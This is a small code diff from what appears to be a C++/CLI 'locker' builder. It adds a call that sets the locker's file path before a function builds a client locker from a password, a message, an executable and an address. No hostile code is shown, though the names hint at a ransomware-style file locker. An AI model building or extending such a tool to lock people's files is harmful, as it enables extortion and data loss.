@@ -48,6 +48,8 @@ void main(array<String^>^ args) {
 #ifdef DEBUG_MODE
 	packLocker("AXHRLocker.exe", "hi", "basic message.");
 #endif
+	setLockerFileName(LOCKER_FILE_PATH);
+
 	if (args->Length >= 3)
 		createClientLocker(args[ARG_FILE_NAME], args[ARG_PASSWORD], args[ARG_MESSAGE], args[ARG_EXE], args[ARG_ADDRESS]);
 
